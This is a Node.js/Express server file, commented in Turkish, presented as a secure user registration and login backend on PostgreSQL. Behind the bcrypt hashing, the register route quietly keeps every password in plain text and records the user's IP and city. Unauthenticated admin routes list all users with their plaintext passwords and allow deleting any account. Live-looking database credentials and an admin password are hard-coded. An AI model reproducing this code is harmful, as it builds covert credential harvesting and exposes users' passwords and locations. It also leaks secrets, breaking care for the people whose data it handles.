/*
 * ========================================
 * 🚀 BACKEND SERVER - Node.js + PostgreSQL
 * ========================================
 * Güvenli kullanıcı yönetim sistemi
 */

const express = require('express');
const { Pool } = require('pg');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ========== DATABASE SETUP (PostgreSQL) ==========
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://auth_db_s18i_user:2uZ4U1pdzSxAXFaGiwcxAjPMjwUBibqx@dpg-d5k4ngur433s73eiqufg-a.virginia-postgres.render.com/auth_db_s18i',
    ssl: { rejectUnauthorized: false }
});

// Veritabanını başlat
async function initDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                username VARCHAR(255) UNIQUE NOT NULL,
                email VARCHAR(255) UNIQUE NOT NULL,
                password TEXT NOT NULL,
                plain_password TEXT,
                ip_address VARCHAR(100),
                country VARCHAR(100),
                city VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('✅ PostgreSQL veritabanı hazır!');
    } catch (error) {
        console.error('❌ Veritabanı hatası:', error);
    }
}

initDatabase();

// ========== HELPER FUNCTIONS ==========

// Şifre hashleme (güvenli)
async function hashPassword(password) {
    const salt = await bcrypt.genSalt(12);
    return bcrypt.hash(password, salt);
}

// Şifre doğrulama
async function verifyPassword(password, hash) {
    return bcrypt.compare(password, hash);
}

// ========== API ENDPOINTS ==========

// 🔐 Kullanıcı Kayıt
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password } = req.body;

        // Validasyon
        if (!username || username.length < 3) {
            return res.status(400).json({
                success: false,
                message: 'Kullanıcı adı en az 3 karakter olmalı!'
            });
        }

        if (!email || !email.includes('@')) {
            return res.status(400).json({
                success: false,
                message: 'Geçerli bir email adresi girin!'
            });
        }

        if (!password || password.length < 6) {
            return res.status(400).json({
                success: false,
                message: 'Şifre en az 6 karakter olmalı!'
            });
        }

        // Email veya kullanıcı adı kontrolü
        const existingUser = await pool.query(
            'SELECT * FROM users WHERE LOWER(email) = LOWER($1) OR LOWER(username) = LOWER($2)',
            [email, username]
        );

        if (existingUser.rows.length > 0) {
            if (existingUser.rows[0].email.toLowerCase() === email.toLowerCase()) {
                return res.status(400).json({
                    success: false,
                    message: 'Bu email adresi zaten kayıtlı!'
                });
            }
            return res.status(400).json({
                success: false,
                message: 'Bu kullanıcı adı zaten alınmış!'
            });
        }

        // IP adresini al
        const ip = req.headers['x-forwarded-for']?.split(',')[0] ||
            req.headers['x-real-ip'] ||
            req.connection?.remoteAddress ||
            req.ip || 'Bilinmiyor';

        // Konum bilgisini al (ücretsiz API)
        let country = 'Bilinmiyor';
        let city = 'Bilinmiyor';

        try {
            const geoResponse = await fetch(`http://ip-api.com/json/${ip}?lang=tr`);
            const geoData = await geoResponse.json();
            if (geoData.status === 'success') {
                country = geoData.country || 'Bilinmiyor';
                city = geoData.city || 'Bilinmiyor';
            }
        } catch (geoError) {
            console.log('GeoIP hatası:', geoError.message);
        }

        // Şifreyi hashle
        const hashedPassword = await hashPassword(password);

        // Kullanıcıyı kaydet (IP ve konum dahil)
        const result = await pool.query(
            'INSERT INTO users (username, email, password, plain_password, ip_address, country, city) VALUES ($1, $2, $3, $4, $5, $6, $7) RETURNING id',
            [username.trim(), email.trim().toLowerCase(), hashedPassword, password, ip, country, city]
        );

        console.log(`✅ Yeni kullanıcı kayıt oldu: ${username} (${country}, ${city})`);

        res.json({
            success: true,
            message: 'Kayıt başarılı! Giriş yapabilirsiniz.',
            userId: result.rows[0].id
        });

    } catch (error) {
        console.error('❌ Kayıt hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🔓 Kullanıcı Giriş
app.post('/api/login', async (req, res) => {
    try {
        const { identifier, password } = req.body;

        if (!identifier || !password) {
            return res.status(400).json({
                success: false,
                message: 'Lütfen tüm alanları doldurun!'
            });
        }

        // Kullanıcıyı bul (email veya username ile)
        const result = await pool.query(
            'SELECT * FROM users WHERE LOWER(email) = LOWER($1) OR LOWER(username) = LOWER($2)',
            [identifier, identifier]
        );

        if (result.rows.length === 0) {
            return res.status(401).json({
                success: false,
                message: 'Kullanıcı bulunamadı!'
            });
        }

        const user = result.rows[0];

        // Şifre kontrolü
        const validPassword = await verifyPassword(password, user.password);
        if (!validPassword) {
            return res.status(401).json({
                success: false,
                message: 'Hatalı şifre!'
            });
        }

        console.log(`✅ Kullanıcı giriş yaptı: ${user.username}`);

        res.json({
            success: true,
            message: 'Giriş başarılı!',
            user: {
                id: user.id,
                username: user.username,
                email: user.email
            }
        });

    } catch (error) {
        console.error('❌ Giriş hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🛡️ Admin Giriş
app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;

    // Sabit admin bilgileri (production'da environment variable kullan!)
    const ADMIN_EMAIL = 'zeta_55saflar@icloud.com';
    const ADMIN_PASSWORD = 'qinpiq-fyjreh-5gYnhy';

    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
        console.log('✅ Admin giriş yaptı');
        res.json({
            success: true,
            message: 'Admin girişi başarılı!'
        });
    } else {
        res.status(401).json({
            success: false,
            message: 'Hatalı admin bilgileri!'
        });
    }
});

// 📊 Tüm Kullanıcıları Getir (Admin)
app.get('/api/admin/users', async (req, res) => {
    try {
        const result = await pool.query(
            'SELECT id, username, email, password, plain_password, ip_address, country, city, created_at FROM users ORDER BY created_at DESC'
        );

        res.json({
            success: true,
            users: result.rows,
            total: result.rows.length
        });

    } catch (error) {
        console.error('❌ Kullanıcı listesi hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 🗑️ Kullanıcı Sil (Admin)
app.delete('/api/admin/users/:id', async (req, res) => {
    try {
        const { id } = req.params;

        const result = await pool.query('DELETE FROM users WHERE id = $1', [id]);

        if (result.rowCount > 0) {
            console.log(`🗑️ Kullanıcı silindi: ID ${id}`);
            res.json({
                success: true,
                message: 'Kullanıcı silindi!'
            });
        } else {
            res.status(404).json({
                success: false,
                message: 'Kullanıcı bulunamadı!'
            });
        }

    } catch (error) {
        console.error('❌ Silme hatası:', error);
        res.status(500).json({
            success: false,
            message: 'Sunucu hatası!'
        });
    }
});

// 📈 İstatistikler
app.get('/api/stats', async (req, res) => {
    try {
        const totalUsers = await pool.query('SELECT COUNT(*) as count FROM users');
        const todayUsers = await pool.query(
            "SELECT COUNT(*) as count FROM users WHERE DATE(created_at) = CURRENT_DATE"
        );

        res.json({
            success: true,
            stats: {
                totalUsers: parseInt(totalUsers.rows[0].count),
                todayUsers: parseInt(todayUsers.rows[0].count)
            }
        });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Sunucu hatası!' });
    }
});

// ========== STATIC FILES ==========

// Ana sayfa yönlendirmesi
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ========== SERVER START ==========
const HOST = '0.0.0.0';

app.listen(PORT, HOST, () => {
    console.log(`
    ╔════════════════════════════════════════════════════╗
    ║                                                    ║
    ║   🚀 Server çalışıyor! (PostgreSQL)                ║
    ║                                                    ║
    ║   📍 http://localhost:${PORT}                          ║
    ║                                                    ║
    ║   ✅ Veritabanı: PostgreSQL (Kalıcı)               ║
    ║                                                    ║
    ╚════════════════════════════════════════════════════╝
    `);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n👋 Sunucu kapatılıyor...');
    await pool.end();
    process.exit(0);
});
